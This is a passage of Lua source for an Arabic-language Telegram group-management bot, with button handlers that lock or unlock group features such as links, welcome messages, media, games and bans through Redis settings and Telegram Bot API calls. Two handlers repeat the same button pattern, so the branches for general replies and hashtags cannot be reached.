return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
end
if Text and Text:match('(.*)/lockdul') and Owner(data) then
if tonumber(Text:match('(.*)/lockdul')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل التنزيل '
redis:set(bot_id..'dw:bot:api'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lock_links') and Owner(data) then
if tonumber(Text:match('(.*)/lock_links')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الرابط '
redis:del(bot_id..'Tshakex:Link_Group'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockmyphoto') and Owner(data) then
if tonumber(Text:match('(.*)/lockmyphoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل صورتي '
redis:set(bot_id..'my_photo:status:bot'..Chat_id,'yazon')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockwelcome') and Owner(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الترحيب '
redis:del(bot_id..'Tshakex:Chek:Welcome'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockwelcome') and Owner(data) then
if tonumber(Text:match('(.*)/lockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الردود العامه '
redis:set(bot_id..'Tshakex:Reply:Sudo'..Chat_id,true)   
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockide') and Owner(data) then
if tonumber(Text:match('(.*)/lockide')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الايدي '
redis:set(bot_id..'Tshakex:Lock:Id:Photo'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockidephoto') and Owner(data) then
if tonumber(Text:match('(.*)/lockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الايدي بالصوره '
redis:set(bot_id..'Tshakex:Lock:Id:Py:Photo'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockkiked') and Owner(data) then
if tonumber(Text:match('(.*)/lockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الحظر '
redis:set(bot_id..'Tshakex:Lock:Ban:Group'..Chat_id,'true')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/locksetm') and Owner(data) then
if tonumber(Text:match('(.*)/locksetm')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الرفع '
redis:set(bot_id..'Tshakex:Cheking:Seted'..Chat_id,'true')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockaddme') and Owner(data) then
if tonumber(Text:match('(.*)/lockaddme')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل ضافني '
redis:del(bot_id..'Added:Me'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/locksehe') and Owner(data) then
if tonumber(Text:match('(.*)/locksehe')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل صيح '
redis:del(bot_id..'Seh:User'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockkikedme') and Owner(data) then
if tonumber(Text:match('(.*)/lockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل اطردني '
redis:set(bot_id..'Tshakex:Cheking:Kick:Me:Group'..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockgames') and Owner(data) then
if tonumber(Text:match('(.*)/lockgames')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الالعاب '
redis:del(bot_id..'Tshakex:Lock:Game:Group'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockrepgr') and Owner(data) then
if tonumber(Text:match('(.*)/lockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تعطيل الردود '
redis:set(bot_id..'Tshakex:Reply:Manager'..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
end
if Text and Text:match('(.*)/unlockdul') and Owner(data) then
if tonumber(Text:match('(.*)/unlockdul')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل التنزيل '
redis:del(bot_id..'dw:bot:api'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlock_links') and Owner(data) then
if tonumber(Text:match('(.*)/unlock_links')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الرابط '
redis:set(bot_id..'Tshakex:Link_Group'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockmyphoto') and Owner(data) then
if tonumber(Text:match('(.*)/unlockmyphoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل صورتي '
redis:del(bot_id..'my_photo:status:bot'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockwelcome') and Owner(data) then
if tonumber(Text:match('(.*)/unlockwelcome')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الترحيب '
redis:set(bot_id..'Tshakex:Chek:Welcome'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockrepall') and Owner(data) then
if tonumber(Text:match('(.*)/unlockrepall')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الردود العامه '
redis:del(bot_id..'Tshakex:Reply:Sudo'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockide') and Owner(data) then
if tonumber(Text:match('(.*)/unlockide')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الايدي '
redis:del(bot_id..'Tshakex:Lock:Id:Photo'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockidephoto') and Owner(data) then
if tonumber(Text:match('(.*)/unlockidephoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الايدي بالصوره '
redis:del(bot_id..'Tshakex:Lock:Id:Py:Photo'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockkiked') and Owner(data) then
if tonumber(Text:match('(.*)/unlockkiked')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الحظر '
redis:del(bot_id..'Tshakex:Lock:Ban:Group'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocksetm') and Owner(data) then
if tonumber(Text:match('(.*)/unlocksetm')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الرفع '
redis:del(bot_id..'Tshakex:Cheking:Seted'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockaddme') and Owner(data) then
if tonumber(Text:match('(.*)/unlockaddme')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل ضافني '
redis:set(bot_id..'Added:Me'..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocksehe') and Owner(data) then
if tonumber(Text:match('(.*)/unlocksehe')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل صيح '
redis:set(bot_id..'Seh:User'..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockkikedme') and Owner(data) then
if tonumber(Text:match('(.*)/unlockkikedme')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل اطردني '
redis:del(bot_id..'Tshakex:Cheking:Kick:Me:Group'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockgames') and Owner(data) then
if tonumber(Text:match('(.*)/unlockgames')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الالعاب '
redis:set(bot_id..'Tshakex:Lock:Game:Group'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockrepgr') and Owner(data) then
if tonumber(Text:match('(.*)/unlockrepgr')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم تفعيل الردود '
redis:del(bot_id..'Tshakex:Reply:Manager'..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddrem"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/homeaddrem') and Owner(data) then
if tonumber(Text:match('(.*)/homeaddrem')) == tonumber(data.sender_user_id_) then
local Texti = 'تستطيع تعطيل وتفعيل عبر الازرار'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعطيل التنزيل', callback_data=data.sender_user_id_.."/lockdul"},{text = 'تفعيل التنزيل', callback_data=data.sender_user_id_.."/unlockdul"},
},
{
{text = 'تعطيل الرابط', callback_data=data.sender_user_id_.."/lock_links"},{text = 'تفعيل الرابط', callback_data=data.sender_user_id_.."/unlock_links"},
},
{
{text = 'تعطيل صورتي', callback_data=data.sender_user_id_.."/lockmyphoto"},{text = 'تفعيل صورتي', callback_data=data.sender_user_id_.."/unlockmyphoto"},
},
{
{text = 'تعطيل الترحيب', callback_data=data.sender_user_id_.."/lockwelcome"},{text = 'تفعيل الترحيب', callback_data=data.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'تعطيل الردود العامه', callback_data=data.sender_user_id_.."/lockrepall"},{text = 'تفعيل الردود العامه', callback_data=data.sender_user_id_.."/unlockrepall"},
},
{
{text = 'تعطيل الايدي', callback_data=data.sender_user_id_.."/lockide"},{text = 'تفعيل الايدي', callback_data=data.sender_user_id_.."/unlockide"},
},
{
{text = 'تعطيل الايدي بالصوره', callback_data=data.sender_user_id_.."/lockidephoto"},{text = 'تفعيل الايدي بالصوره', callback_data=data.sender_user_id_.."/unlockidephoto"},
},
{
{text = 'تعطيل الحظر', callback_data=data.sender_user_id_.."/lockkiked"},{text = 'تفعيل الحظر', callback_data=data.sender_user_id_.."/unlockkiked"},
},
{
{text = 'تعطيل الرفع', callback_data=data.sender_user_id_.."/locksetm"},{text = 'تفعيل الرفع', callback_data=data.sender_user_id_.."/unlocksetm"},
},
{
{text = 'تعطيل ضافني', callback_data=data.sender_user_id_.."/lockaddme"},{text = 'تفعيل ضافني', callback_data=data.sender_user_id_.."/unlockaddme"},
},
{
{text = 'تعطيل صيح', callback_data=data.sender_user_id_.."/locksehe"},{text = 'تفعيل صيح', callback_data=data.sender_user_id_.."/unlocksehe"},
},
{
{text = 'تعطيل اطردني', callback_data=data.sender_user_id_.."/lockkikedme"},{text = 'تفعيل اطردني', callback_data=data.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'تعطيل الالعاب', callback_data=data.sender_user_id_.."/lockgames"},{text = 'تفعيل الالعاب', callback_data=data.sender_user_id_.."/unlockgames"},
},
{
{text = 'تعطيل الردود', callback_data=data.sender_user_id_.."/lockrepgr"},{text = 'تفعيل الردود', callback_data=data.sender_user_id_.."/unlockrepgr"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/lockjoine') and Admin(data) then
if tonumber(Text:match('(.*)/lockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الاضافه '
redis:set(bot_id.."Tshakex:Lock:AddMempar"..Chat_id,"kick")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockchat') and Admin(data) then
if tonumber(Text:match('(.*)/lockchat')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الدردشه '
redis:set(bot_id.."Tshakex:Lock:text"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lock_joine') and Admin(data) then
if tonumber(Text:match('(.*)/lock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الدخول '
redis:set(bot_id.."Tshakex:Lock:Join"..Chat_id,"kick")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockbots') and Admin(data) then
if tonumber(Text:match('(.*)/lockbots')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل البوتات '
redis:set(bot_id.."Tshakex:Lock:Bot:kick"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/locktags') and Admin(data) then
if tonumber(Text:match('(.*)/locktags')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الاشعارات '
redis:set(bot_id.."Tshakex:Lock:tagservr"..Chat_id,true)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockedit') and Admin(data) then
if tonumber(Text:match('(.*)/lockedit')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل التعديل '
redis:set(bot_id.."Tshakex:Lock:edit"..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/locklink') and Admin(data) then
if tonumber(Text:match('(.*)/locklink')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الروابط '
redis:set(bot_id.."Tshakex:Lock:Link"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockusername') and Admin(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل المعرفات '
redis:set(bot_id.."Tshakex:Lock:User:Name"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockusername') and Admin(data) then
if tonumber(Text:match('(.*)/lockusername')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل التاك '
redis:set(bot_id.."Tshakex:Lock:hashtak"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/locksticar') and Admin(data) then
if tonumber(Text:match('(.*)/locksticar')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الملصقات '
redis:set(bot_id.."Tshakex:Lock:Sticker"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockgif') and Admin(data) then
if tonumber(Text:match('(.*)/lockgif')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل المتحركات '
redis:set(bot_id.."Tshakex:Lock:Animation"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockvideo') and Admin(data) then
if tonumber(Text:match('(.*)/lockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الفيديو '
redis:set(bot_id.."Tshakex:Lock:Video"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockphoto') and Admin(data) then
if tonumber(Text:match('(.*)/lockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الصور '
redis:set(bot_id.."Tshakex:Lock:Photo"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockvoise') and Admin(data) then
if tonumber(Text:match('(.*)/lockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الاغاني '
redis:set(bot_id.."Tshakex:Lock:Audio"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockaudo') and Admin(data) then
